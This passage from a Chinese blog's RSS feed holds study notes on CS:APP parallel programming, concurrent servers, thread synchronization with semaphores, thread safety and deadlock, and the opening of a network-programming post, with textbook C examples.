  分割成t部分,每个部分范围$\lfloor n / t \rfloor$&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Thread routine for psum-array.c */ 
void *sum_array(void *vargp) { 
    long myid = *((long *)vargp); /* Extract thread ID */ 
    long start = myid * nelems_per_thread; /* Start element index */ 
    long end = start + nelems_per_thread; /* End element index */ 
    long i; 
    for (i = start; i &amp;lt; end; i++) { psum[myid] += i; } 
    return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
  为了充分利用寄存器,例程应使用局部变量:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Thread routine for psum-local.c */ 
void *sum_local(void *vargp) { 
    long myid = *((long *)vargp); /* Extract thread ID */ 
    long start = myid * nelems_per_thread; /* Start element index */ 
    long end = start + nelems_per_thread; /* End element index */ 
    long i, sum = 0; 
    for (i = start; i &amp;lt; end; i++) { sum += i; } 
    psum[myid] = sum; 
    return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对$n=2^{31}$规模的任务,两者的运行时间如下:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214102140.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;对于p核处理器,$T_{k}$是使用k核的运行时间
定义:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加速比:$S_{p}=T_{1} / T_{p}$&lt;/li&gt;
&lt;li&gt;效率比:$E_{p} = S_{p} / p = T_{1} / (p T_{p})$&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;教训&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;采取并行策略:分治&lt;/li&gt;
&lt;li&gt;在循环内部不要写同步语句,这样会导致运行很慢&lt;/li&gt;
&lt;li&gt;阿姆达尔定律:如果总是提升某一部分的性能,那么其他部分会称为瓶颈.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;内存一致性的硬件保障&lt;/h1&gt;
&lt;p&gt;对每个缓存块标记状态:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Invalid: Cannot use value&lt;/li&gt;
&lt;li&gt;Shared: Readable copy&lt;/li&gt;
&lt;li&gt;Exclusive: Writeable copy
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250214115924.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 11 Feb 2025 16:00:00 GMT</pubDate></item><item><title>并发编程</title><link>https://tankimzeg.top/blog/csapp/concurrent-programming/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/concurrent-programming/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/concurrent-programming/&quot;&gt;https://tankimzeg.top/blog/csapp/concurrent-programming/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;并发程序的典型问题&lt;/h1&gt;
&lt;p&gt;我在shell lab中使用信号机制的混乱程度让我印象深刻,并发程序确实容易有各种bug.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;竞争:结果与系统进程调度有关.&lt;/li&gt;
&lt;li&gt;死锁:对某些系统资源的锁定引发永远的等待.
  例如,主函数使用了&lt;code&gt;printf&lt;/code&gt;函数,取得了stdout的锁定.这时候被一个信号打断了,信号处理函数又使用&lt;code&gt;printf&lt;/code&gt;函数往stdout打印内容,stdout被占用就会一直等待.&lt;/li&gt;
&lt;li&gt;活锁/饥饿/公平&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;并发服务器&lt;/h1&gt;
&lt;p&gt;我之前自学网络编程的时候,自己写过一个FTP并发服务器,所以现在对这些概念理解起来很容易hh.
创建并发服务器的方法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[[并发编程#基于进程|基于进程]]&lt;ul&gt;
&lt;li&gt;内核自动调度逻辑流&lt;/li&gt;
&lt;li&gt;每个逻辑流有私有地址空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;事件驱动&lt;ul&gt;
&lt;li&gt;程序手动管理逻辑流&lt;/li&gt;
&lt;li&gt;所有逻辑流共享地址空间&lt;/li&gt;
&lt;li&gt;I/O复用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基于线程&lt;ul&gt;
&lt;li&gt;内核自动调度逻辑流&lt;/li&gt;
&lt;li&gt;每个逻辑流共享地址空间&lt;/li&gt;
&lt;li&gt;以上两种的结合&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;基于进程&lt;/h2&gt;
&lt;p&gt;我做的并发服务器就是这个方法,放几个图加深一下印象就行,不必赘述.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211120225.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* echoserverp.c */

int main(int argc, char **argv) { 
	int listenfd, connfd; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	Signal(SIGCHLD, sigchld_handler); 
	listenfd = Open_listenfd(argv[1]); 
	while (1) { 
		clientlen = sizeof(struct sockaddr_storage); 
		connfd = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		if (Fork() == 0) { 
			Close(listenfd); /* Child closes its listening socket */ 
			echo(connfd); /* Child services client */ 
			Close(connfd); /* Child closes connection with client */ 
			exit(0); /* Child exits */ 
		} 
		Close(connfd); /* Parent closes connected socket (important!) */ 
	} 
}

void sigchld_handler(int sig) { while (waitpid(-1, 0, WNOHANG) &amp;gt; 0) ; return; }
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;优点:简单&lt;/li&gt;
&lt;li&gt;缺点:开销较大,子进程不共享变量&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;基于I/O多路复用的并发事件驱动服务器&lt;/h2&gt;
&lt;p&gt;见CS:APP 686
我看了一下书里的代码,基本思想就是维护一个客户端池(一个文件描述符表),然后用死循环调用&lt;code&gt;select&lt;/code&gt;函数,能监视它们是否准备好读.
一旦发现&lt;code&gt;listen&lt;/code&gt;准备好读,添加客户端池;一旦发现客户端套接字准备好读,处理该客户端套接字.&lt;/p&gt;
&lt;p&gt;现代高性能Web服务器(nginx),都是基于I/O复用.优点是开销小;缺点是代码比较复杂.&lt;/p&gt;
&lt;h2&gt;基于线程&lt;/h2&gt;
&lt;p&gt;&amp;quot;线程是轻量级的进程&amp;quot;&lt;/p&gt;
&lt;p&gt;进程 = 进程上下文 + 代码,数据,堆栈
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211165558.png&quot; alt=&quot;&quot;&gt;
进程 = 线程+ 代码,数据,堆,内核上下文
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211165754.png&quot; alt=&quot;&quot;&gt;
这只是视角的不同!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个线程有自己的逻辑控制流&lt;/li&gt;
&lt;li&gt;每个线程共享代码,数据,内核上下文&lt;/li&gt;
&lt;li&gt;每个线程有自己的栈&lt;/li&gt;
&lt;li&gt;每个线程有线程TID&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* echoservert.c */
int main(int argc, char **argv) { 
	int listenfd, *connfdp; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	pthread_t tid; 
	
	listenfd = Open_listenfd(argv[1]); 
	while (1) { 
		clientlen=sizeof(struct sockaddr_storage); 
		connfdp = Malloc(sizeof(int)); 
		*connfdp = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		Pthread_create(&amp;amp;tid, NULL, thread, connfdp);
	}
}
/* Thread routine */ 
void *thread(void *vargp) { 
	int connfd = *((int *)vargp); 
	Pthread_detach(pthread_self()); 
	Free(vargp); 
	echo(connfd); 
	Close(connfd); 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211172356.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在使用线程时需要小心的是,由于线程共享变量,也不对自己的栈设置保护,一个线程向另一个线程传递局部变量(的指针)是危险的行为.正因如此,上面echo服务器才使用了&lt;code&gt;malloc&lt;/code&gt;将变量放在堆里而不是栈里.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 10 Feb 2025 16:00:00 GMT</pubDate></item><item><title>同步</title><link>https://tankimzeg.top/blog/csapp/synchronization/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/synchronization/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/synchronization/&quot;&gt;https://tankimzeg.top/blog/csapp/synchronization/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;线程内存模型&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;概念模型&lt;ul&gt;
&lt;li&gt;多个线程在单个进程的上下文中运行.&lt;/li&gt;
&lt;li&gt;每个线程都有自己独立的线程上下文:线程ID,栈,栈指针,程序计数器,条件码,寄存器值&lt;/li&gt;
&lt;li&gt;所有线程共享剩余的进程上下文,进程上下文由内核维护.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;实际上,线程是共享的,不设保护,一个线程的栈能访问另一个线程的栈.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;变量内存映射&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;全局变量:任何全局变量,虚拟内存只包含一个示例&lt;/li&gt;
&lt;li&gt;局部变量:每个线程的栈包含局部变量的一个示例&lt;/li&gt;
&lt;li&gt;局部静态变量:任何局部静态变量,虚拟内存只包含一个示例,只供该函数使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;同步(Synchronization)线程&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* badcnt.c */
/* Global shared variable */ 
volatile long cnt = 0; /* Counter */ 
int main(int argc, char **argv) { 
	long niters; 
	pthread_t tid1, tid2; 
	niters = atoi(argv[1]); 
	Pthread_create(&amp;amp;tid1, NULL, thread, &amp;amp;niters); 
	Pthread_create(&amp;amp;tid2, NULL, thread, &amp;amp;niters); 
	Pthread_join(tid1, NULL); 
	Pthread_join(tid2, NULL); 
	
	/* Check result */ 
	if (cnt != (2 * niters)) 
		printf(&amp;quot;BOOM! cnt=%ld\n&amp;quot;, cnt); 
	else printf(&amp;quot;OK cnt=%ld\n&amp;quot;, cnt); 
		exit(0); 
}

/* Thread routine */ 
void *thread(void *vargp) { 
	long i, niters = *((long *)vargp); 
	for (i = 0; i &amp;lt; niters; i++) cnt++; 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个程序会发生同步错误.
&lt;code&gt;voatile&lt;/code&gt;是保证编译器将变量从内存存取的关键字.
导致了cnt变量自增操作的非原子性.
分析竞争时,甚至需要从汇编层面观察:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movq (%rdi), %rcx 
	testq %rcx,%rcx 
	jle .L2 
	movl $0, %eax            H:Head
.L3: 
	movq cnt(%rip),%rdx      L:Load cnt
	addq $1, %rdx            U:Update cnt
	movq %rdx, cnt(%rip)     S:Store cnt
	addq $1, %rax 
	cmpq %rcx, %rax 
	jne .L3                  T:Tail
.L2:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;L,U,S是三个关键操作,却没有保证原子性,那么,当线程被调度打断后,就会出现不一致的情况.这一点我在数据库课程中也见识过了.&lt;/p&gt;
&lt;h2&gt;进度图&lt;/h2&gt;
&lt;p&gt;在并行线程中,一条线段是一个原子事务.
通过过程图来分析上述过程:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211222712.png&quot; alt=&quot;&quot;&gt;
堆全局变量cnt进行操作的临界区不应该被交错,两个临界区交错的区域称为不安全区.
真实一目了然!这样解释很有意思!&lt;/p&gt;
&lt;h2&gt;信号量(Semaphore)&lt;/h2&gt;
&lt;p&gt;使用信号量是一个基础的解决办法.
信号量:非负全局整数同步变量.由两个内核函数P和V操作.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P(s)&lt;ul&gt;
&lt;li&gt;如果s非零,那么s减1并立即返回&lt;ul&gt;
&lt;li&gt;检测和减小操作是原子性的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果s是0,那么挂起线程直到s变成非零由V函数重启.&lt;/li&gt;
&lt;li&gt;重启后,P减小s并将控制权返回给调用者&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;V(s)&lt;ul&gt;
&lt;li&gt;将s增加1(增加操作是原子性的)&lt;/li&gt;
&lt;li&gt;如果有线程阻塞在P操作上,重启其中一个线程,然后P操作可以减小s
利用这个非负的属性,可以实现对临界区的互斥访问.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;semaphore.h&amp;gt;
int sem_init(sem_t *s, 0, unsigned int val);} /* s = val */ 
int sem_wait(sem_t *s); /* P(s) */ 
int sem_post(sem_t *s); /* V(s) */
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;互斥锁&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基本思想:&lt;ul&gt;
&lt;li&gt;将一个信号量&lt;em&gt;mutex&lt;/em&gt;初始化为1,共享变量&lt;/li&gt;
&lt;li&gt;将临界区用*P(mutex)&lt;em&gt;和&lt;/em&gt;V(mutex)*包裹起来,实现了&amp;quot;加锁&amp;quot;的操作.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;术语:&lt;ul&gt;
&lt;li&gt;二进制信号量:总是为0或1&lt;/li&gt;
&lt;li&gt;mutex:用于**互斥(mutual exclusion)**的二进制信号量&lt;ul&gt;
&lt;li&gt;P操作:加锁&lt;/li&gt;
&lt;li&gt;V操作:解锁或释放&lt;/li&gt;
&lt;li&gt;持有互斥锁:互斥锁以加锁但未释放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;计数信号量(Counting semaphore):计数器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;修改循环的代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;for (i = 0; i &amp;lt; niters; i++) { 
	P(&amp;amp;mutex); 
	cnt++; 
	V(&amp;amp;mutex); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在,过程图变成这样:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250211233255.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;协调对共享资源的访问&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;基本思想&lt;ul&gt;
&lt;li&gt;使用信号量通知其他线程&lt;/li&gt;
&lt;li&gt;使用计数信号量追踪资源的状态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两个经典例子:&lt;ul&gt;
&lt;li&gt;生产者-消费者问题&lt;/li&gt;
&lt;li&gt;读写问题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;生产者-消费者问题&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250212182944.png&quot; alt=&quot;&quot;&gt;
生产者等待空位,向缓冲区放入物品,然后通知消费者
消费者等待物品,从缓冲区移除物品,然后通知生产者
需要锁和两个计数信号量:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mutex:向缓冲区加互斥锁&lt;/li&gt;
&lt;li&gt;slots:空位数&lt;/li&gt;
&lt;li&gt;items:物品数
数据结构:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;quot;csapp.h&amp;quot;
typedef struct { 
	int *buf; /* Buffer array */ 
	int n; /* Maximum number of slots */ 
	int front; /* buf[(front+1)%n] is first item */ 
	int rear; /* buf[rear%n] is last item */ 
	sem_t mutex; /* Protects accesses to buf */ 
	sem_t slots; /* Counts available slots */ 
	sem_t items; /* Counts available items */ 
} sbuf_t; 

void sbuf_init(sbuf_t *sp, int n); 
void sbuf_deinit(sbuf_t *sp); 
void sbuf_insert(sbuf_t *sp, int item); 
int sbuf_remove(sbuf_t *sp);

/* Create an empty, bounded, shared FIFO buffer with n slots */ 
void sbuf_init(sbuf_t *sp, int n) { 
	sp-&amp;gt;buf = Calloc(n, sizeof(int)); 
	sp-&amp;gt;n = n; /* Buffer holds max of n items */ 
	sp-&amp;gt;front = sp-&amp;gt;rear = 0; /* Empty buffer iff front == rear */ 
	Sem_init(&amp;amp;sp-&amp;gt;mutex, 0, 1); /* Binary semaphore for locking */ 
	Sem_init(&amp;amp;sp-&amp;gt;slots, 0, n); /* Initially, buf has n empty slots */ 
	Sem_init(&amp;amp;sp-&amp;gt;items, 0, 0); /* Initially, buf has 0 items */ 
} 

/* Clean up buffer sp */ 
void sbuf_deinit(sbuf_t *sp) { Free(sp-&amp;gt;buf); }
/* Insert item onto the rear of shared buffer sp */ 
void sbuf_insert(sbuf_t *sp, int item) { 
	P(&amp;amp;sp-&amp;gt;slots); /* Wait for available slot */ 
	P(&amp;amp;sp-&amp;gt;mutex); /* Lock the buffer */ 
	sp-&amp;gt;buf[(++sp-&amp;gt;rear)%(sp-&amp;gt;n)] = item; /* Insert the item */ 
	V(&amp;amp;sp-&amp;gt;mutex); /* Unlock the buffer */ 
	V(&amp;amp;sp-&amp;gt;items); /* Announce available item */ 
}
/* Remove and return the first item from buffer sp */ 
int sbuf_remove(sbuf_t *sp) { 
	int item; P(&amp;amp;sp-&amp;gt;items); /* Wait for available item */ 
	P(&amp;amp;sp-&amp;gt;mutex); /* Lock the buffer */ 
	item = sp-&amp;gt;buf[(++sp-&amp;gt;front)%(sp-&amp;gt;n)]; /* Remove the item */ 
	V(&amp;amp;sp-&amp;gt;mutex); /* Unlock the buffer */ 
	V(&amp;amp;sp-&amp;gt;slots); /* Announce available slot */ 
	return item; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;读写问题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;读取线程只读文件&lt;/li&gt;
&lt;li&gt;写线程修改文件&lt;/li&gt;
&lt;li&gt;写线程必须对文件有互斥锁&lt;/li&gt;
&lt;li&gt;读取线程不限量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;多样的读写问题:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一类读写问题(有利于读)
 读方不应该等待,除非写方已经取得使用权
 读操作就算比写操作后来,也具有更高优先级&lt;/li&gt;
&lt;li&gt;第二类读写问题(有利于写)
 一旦写操作就绪,尽快实行
 读操作就算比写操作先来,也要等写操作&lt;/li&gt;
&lt;li&gt;两种策略都有发生饥饿的风险&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一类读写问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Writers:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void writer(void) { 
    while (1) { 
        P(&amp;amp;w); 
        
        /* Critical section */ 
        /* Writing happens */ 
        
        V(&amp;amp;w); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;Readers:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int readcnt; /* Initially = 0 */ 
sem_t mutex, w; /* Initially = 1 */ 
void reader(void) { 
    while (1) { 
        P(&amp;amp;mutex); 
        readcnt++; 
        if (readcnt == 1) /* First in */ 
            P(&amp;amp;w); 
        V(&amp;amp;mutex); 
        
        /* Critical section */ 
        /* Reading happens */ 
        
        P(&amp;amp;mutex); 
        readcnt--; 
        if (readcnt == 0) /* Last out */ 
            V(&amp;amp;w); 
        V(&amp;amp;mutex); 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;线程池并发服务器&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250212200018.png&quot; alt=&quot;&quot;&gt;
之前的服务器不断地创建销毁线程,造成了性能的浪费.不如提前准备好一个线程池,有任务时从线程池取出线程进行处理.
在这个模型中,主线程提供的客户端请求相当于生产者,线程池相当于消费者.
代码还是很精妙的:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;sbuf_t sbuf; /* Shared buffer of connected descriptors */ 
int main(int argc, char **argv) { 
	int i, listenfd, connfd; 
	socklen_t clientlen; 
	struct sockaddr_storage clientaddr; 
	pthread_t tid; 
	
	listenfd = Open_listenfd(argv[1]); 
	sbuf_init(&amp;amp;sbuf, SBUFSIZE); 
	for (i = 0; i &amp;lt; NTHREADS; i++) /* Create worker threads */ 
		Pthread_create(&amp;amp;tid, NULL, thread, NULL); 
	while (1) { 
		clientlen = sizeof(struct sockaddr_storage); 
		connfd = Accept(listenfd, (SA *) &amp;amp;clientaddr, &amp;amp;clientlen); 
		sbuf_insert(&amp;amp;sbuf, connfd); /* Insert connfd in buffer */ 
	} 
}
void *thread(void *vargp) { 
	Pthread_detach(pthread_self()); 
	while (1) { 
		int connfd = sbuf_remove(&amp;amp;sbuf); /* Remove connfd from buf */ 
		echo_cnt(connfd); /* Service client */ 
		Close(connfd); 
	} 
}

static int byte_cnt; /* Byte counter */ 
static sem_t mutex; /* and the mutex that protects it */ 
static void init_echo_cnt(void) { Sem_init(&amp;amp;mutex, 0, 1); byte_cnt = 0; }

void echo_cnt(int connfd) { 
	int n; char buf[MAXLINE]; 
	rio_t rio; 
	static pthread_once_t once = PTHREAD_ONCE_INIT; 
	
	Pthread_once(&amp;amp;once, init_echo_cnt);  // 只有第一个运行到这里的线程会执行
	Rio_readinitb(&amp;amp;rio, connfd); 
	while((n = Rio_readlineb(&amp;amp;rio, buf, MAXLINE)) != 0) { 
		P(&amp;amp;mutex); 
		byte_cnt += n; 
		printf(&amp;quot;thread %d received %d (%d total) bytes on fd %d\n&amp;quot;, (int) pthread_self(), n, byte_cnt, connfd); 
		V(&amp;amp;mutex); 
		Rio_writen(connfd, buf, n); 
	} 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;线程安全&lt;/h1&gt;
&lt;p&gt;如果一个函数能够被多个并发线程调用而不影响正确结果的是线程安全的函数.
线程只应使用线程安全的函数.
四种线程不安全的函数:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不保护共享变量的函数&lt;/li&gt;
&lt;li&gt;在多次调用中追踪状态的函数
 将状态存储在某个全局变量,私有或公共全局变量中.多个线程将访问该状态.&lt;/li&gt;
&lt;li&gt;返回指向同一个位置(静态变量)的指针的函数
 每一次调用的结果都被覆写&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* lock-and-copy version */ 
char *ctime_ts(const time_t *timep, char *privatep) { 
    char *sharedp; 
    
    P(&amp;amp;mutex); 
    sharedp = ctime(timep); 
    strcpy(privatep, sharedp); 
    V(&amp;amp;mutex); 
    return privatep; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;任何调用线程不安全函数的函数🤣&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;可重入函数&lt;/h2&gt;
&lt;p&gt;可重入函数是线程安全函数的一个子类.
如果函数不访问共享变量,就是可重入函数.
使第二类线程不安全函数变安全唯一办法是让它变成可重入函数.共享变量作为参数传入.&lt;/p&gt;
&lt;h2&gt;死锁&lt;/h2&gt;
&lt;p&gt;如果一个进程等待一个永远不会成立的条件,就进入了死锁.
进程1取得A的锁,等待B解锁
这时候进程1 被打断,调度到进程2
进程2取得B的锁,等待A解锁&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main() { 
	pthread_t tid[2]; 
	Sem_init(&amp;amp;mutex[0], 0, 1); /* mutex[0] = 1 */ 
	Sem_init(&amp;amp;mutex[1], 0, 1); /* mutex[1] = 1 */ 
	Pthread_create(&amp;amp;tid[0], NULL, count, (void*) 0); 
	Pthread_create(&amp;amp;tid[1], NULL, count, (void*) 1); 
	Pthread_join(tid[0], NULL); 
	Pthread_join(tid[1], NULL); 
	printf(&amp;quot;cnt=%d\n&amp;quot;, cnt); exit(0); 
} 

void *count(void *vargp) { 
	int i; 
	int id = (int) vargp; 
	for (i = 0; i &amp;lt; NITERS; i++) { 
		P(&amp;amp;mutex[id]); P(&amp;amp;mutex[1-id]); 
		cnt++; 
		V(&amp;amp;mutex[id]); V(&amp;amp;mutex[1-id]); 
	} 
	return NULL; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Tid[0]&lt;/th&gt;
&lt;th&gt;Tid[1]&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;进度图:
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250212205837.png&quot; alt=&quot;&quot;&gt;
如果以一个固定的顺序取得资源的锁就可以解决这个问题:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Tid[0]&lt;/th&gt;
&lt;th&gt;Tid[1]&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;td&gt;P(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;td&gt;P(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;td&gt;cnt++&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V(s1)&lt;/td&gt;
&lt;td&gt;V(s0)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250212210221.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 10 Feb 2025 16:00:00 GMT</pubDate></item><item><title>网络编程</title><link>https://tankimzeg.top/blog/csapp/network-programming/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/network-programming/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/network-programming/&quot;&gt;https://tankimzeg.top/blog/csapp/network-programming/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;C/S模型&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210161823.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210162123.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;计算机网络&lt;/h1&gt;
&lt;p&gt;简单讲了计算机网络的知识,这我可不陌生😋.&lt;/p&gt;
&lt;h1&gt;套接字&lt;/h1&gt;
&lt;p&gt;对应用来说,套接字是交流的端点;对内核来说,套接字是一个文件描述符供应用从网络读写.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250210190312.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;不得不说,外国教学的图片都好好看喔&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这部分套接字操作的介绍,可见于我的OneNote笔记本.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将socket和它使用的协议/IP地址等信息联系起来,就抽象成了一个结构体:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct sockaddr { 
	uint16_t sa_family; /* Protocol family */ 
	char sa_data[14]; /* Address data. */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在实际应用中,使用更具体的&lt;/p&gt;
